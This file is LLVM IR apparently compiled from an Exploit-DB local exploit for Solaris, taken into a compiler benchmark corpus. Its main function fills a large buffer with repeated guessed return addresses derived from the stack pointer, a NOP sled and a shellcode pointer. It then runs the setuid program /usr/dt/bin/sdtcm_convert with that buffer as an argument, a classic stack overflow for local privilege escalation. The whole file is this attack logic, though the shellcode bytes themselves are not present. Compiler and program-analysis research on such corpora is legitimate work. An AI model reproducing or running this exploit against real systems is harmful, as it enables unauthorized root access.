; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19128.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19128.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@main.x = internal global [11000 x i8] zeroinitializer, align 16
@ret_adr = common dso_local global i32 0, align 4
@i = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"%lx\0A\00", align 1
@OFFSET1 = common dso_local global i32 0, align 4
@ADJUST = common dso_local global i32 0, align 4
@LENGTH1 = common dso_local global i32 0, align 4
@OFFSET2 = common dso_local global i32 0, align 4
@LENGTH2 = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@exploit_code = common dso_local global i8* null, align 8
@OFFSET3 = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"/usr/dt/bin/sdtcm_convert\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"sdtcm_convert\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"test\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = call i32 @memset(i8* getelementptr inbounds ([11000 x i8], [11000 x i8]* @main.x, i64 0, i64 0), i8 signext 97, i32 10000)
  %3 = call i32 (...) @get_sp()
  %4 = sub nsw i32 %3, 6300
  store i32 %4, i32* @ret_adr, align 4
  store i32 0, i32* @i, align 4
  br label %5

5:                                                ; preds = %40, %0
  %6 = load i32, i32* @i, align 4
  %7 = icmp slt i32 %6, 5000
  br i1 %7, label %8, label %43

8:                                                ; preds = %5
  %9 = load i32, i32* @ret_adr, align 4
  %10 = and i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = load i32, i32* @i, align 4
  %13 = add nsw i32 %12, 3
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %14
  store i8 %11, i8* %15, align 1
  %16 = load i32, i32* @ret_adr, align 4
  %17 = ashr i32 %16, 8
  %18 = and i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = load i32, i32* @i, align 4
  %21 = add nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %22
  store i8 %19, i8* %23, align 1
  %24 = load i32, i32* @ret_adr, align 4
  %25 = ashr i32 %24, 16
  %26 = and i32 %25, 255
  %27 = trunc i32 %26 to i8
  %28 = load i32, i32* @i, align 4
  %29 = add nsw i32 %28, 1
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %30
  store i8 %27, i8* %31, align 1
  %32 = load i32, i32* @ret_adr, align 4
  %33 = ashr i32 %32, 24
  %34 = and i32 %33, 255
  %35 = trunc i32 %34 to i8
  %36 = load i32, i32* @i, align 4
  %37 = add nsw i32 %36, 0
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %38
  store i8 %35, i8* %39, align 1
  br label %40

40:                                               ; preds = %8
  %41 = load i32, i32* @i, align 4
  %42 = add nsw i32 %41, 4
  store i32 %42, i32* @i, align 4
  br label %5

43:                                               ; preds = %5
  %44 = call i32 (...) @get_sp()
  %45 = sub nsw i32 %44, 10200
  store i32 %45, i32* @ret_adr, align 4
  %46 = load i32, i32* @ret_adr, align 4
  %47 = and i32 %46, 255
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %52

49:                                               ; preds = %43
  %50 = load i32, i32* @ret_adr, align 4
  %51 = add nsw i32 %50, 4
  store i32 %51, i32* @ret_adr, align 4
  br label %52

52:                                               ; preds = %49, %43
  %53 = load i32, i32* @ret_adr, align 4
  %54 = call i32 @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 %53)
  %55 = load i32, i32* @OFFSET1, align 4
  %56 = load i32, i32* @ADJUST, align 4
  %57 = add nsw i32 %55, %56
  store i32 %57, i32* @i, align 4
  br label %58

58:                                               ; preds = %96, %52
  %59 = load i32, i32* @i, align 4
  %60 = load i32, i32* @OFFSET1, align 4
  %61 = load i32, i32* @LENGTH1, align 4
  %62 = add nsw i32 %60, %61
  %63 = icmp slt i32 %59, %62
  br i1 %63, label %64, label %99

64:                                               ; preds = %58
  %65 = load i32, i32* @ret_adr, align 4
  %66 = and i32 %65, 255
  %67 = trunc i32 %66 to i8
  %68 = load i32, i32* @i, align 4
  %69 = add nsw i32 %68, 3
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %70
  store i8 %67, i8* %71, align 1
  %72 = load i32, i32* @ret_adr, align 4
  %73 = ashr i32 %72, 8
  %74 = and i32 %73, 255
  %75 = trunc i32 %74 to i8
  %76 = load i32, i32* @i, align 4
  %77 = add nsw i32 %76, 2
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %78
  store i8 %75, i8* %79, align 1
  %80 = load i32, i32* @ret_adr, align 4
  %81 = ashr i32 %80, 16
  %82 = and i32 %81, 255
  %83 = trunc i32 %82 to i8
  %84 = load i32, i32* @i, align 4
  %85 = add nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %86
  store i8 %83, i8* %87, align 1
  %88 = load i32, i32* @ret_adr, align 4
  %89 = ashr i32 %88, 24
  %90 = and i32 %89, 255
  %91 = trunc i32 %90 to i8
  %92 = load i32, i32* @i, align 4
  %93 = add nsw i32 %92, 0
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %94
  store i8 %91, i8* %95, align 1
  br label %96

96:                                               ; preds = %64
  %97 = load i32, i32* @i, align 4
  %98 = add nsw i32 %97, 4
  store i32 %98, i32* @i, align 4
  br label %58

99:                                               ; preds = %58
  %100 = load i32, i32* @OFFSET2, align 4
  %101 = load i32, i32* @ADJUST, align 4
  %102 = add nsw i32 %100, %101
  store i32 %102, i32* @i, align 4
  br label %103

103:                                              ; preds = %141, %99
  %104 = load i32, i32* @i, align 4
  %105 = load i32, i32* @OFFSET2, align 4
  %106 = load i32, i32* @LENGTH2, align 4
  %107 = add nsw i32 %105, %106
  %108 = icmp slt i32 %104, %107
  br i1 %108, label %109, label %144

109:                                              ; preds = %103
  %110 = load i32, i32* @NOP, align 4
  %111 = and i32 %110, 255
  %112 = trunc i32 %111 to i8
  %113 = load i32, i32* @i, align 4
  %114 = add nsw i32 %113, 3
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %115
  store i8 %112, i8* %116, align 1
  %117 = load i32, i32* @NOP, align 4
  %118 = ashr i32 %117, 8
  %119 = and i32 %118, 255
  %120 = trunc i32 %119 to i8
  %121 = load i32, i32* @i, align 4
  %122 = add nsw i32 %121, 2
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %123
  store i8 %120, i8* %124, align 1
  %125 = load i32, i32* @NOP, align 4
  %126 = ashr i32 %125, 16
  %127 = and i32 %126, 255
  %128 = trunc i32 %127 to i8
  %129 = load i32, i32* @i, align 4
  %130 = add nsw i32 %129, 1
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %131
  store i8 %128, i8* %132, align 1
  %133 = load i32, i32* @NOP, align 4
  %134 = ashr i32 %133, 24
  %135 = and i32 %134, 255
  %136 = trunc i32 %135 to i8
  %137 = load i32, i32* @i, align 4
  %138 = add nsw i32 %137, 0
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %139
  store i8 %136, i8* %140, align 1
  br label %141

141:                                              ; preds = %109
  %142 = load i32, i32* @i, align 4
  %143 = add nsw i32 %142, 4
  store i32 %143, i32* @i, align 4
  br label %103

144:                                              ; preds = %103
  store i32 0, i32* @i, align 4
  br label %145

145:                                              ; preds = %163, %144
  %146 = load i32, i32* @i, align 4
  %147 = load i8*, i8** @exploit_code, align 8
  %148 = call i32 @strlen(i8* %147)
  %149 = icmp slt i32 %146, %148
  br i1 %149, label %150, label %166

150:                                              ; preds = %145
  %151 = load i8*, i8** @exploit_code, align 8
  %152 = load i32, i32* @i, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %151, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = load i32, i32* @OFFSET3, align 4
  %157 = load i32, i32* @ADJUST, align 4
  %158 = add nsw i32 %156, %157
  %159 = load i32, i32* @i, align 4
  %160 = add nsw i32 %158, %159
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds [11000 x i8], [11000 x i8]* @main.x, i64 0, i64 %161
  store i8 %155, i8* %162, align 1
  br label %163

163:                                              ; preds = %150
  %164 = load i32, i32* @i, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* @i, align 4
  br label %145

166:                                              ; preds = %145
  store i8 0, i8* getelementptr inbounds ([11000 x i8], [11000 x i8]* @main.x, i64 0, i64 10000), align 16
  %167 = call i32 @execl(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([11000 x i8], [11000 x i8]* @main.x, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8* null)
  %168 = load i32, i32* %1, align 4
  ret i32 %168
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
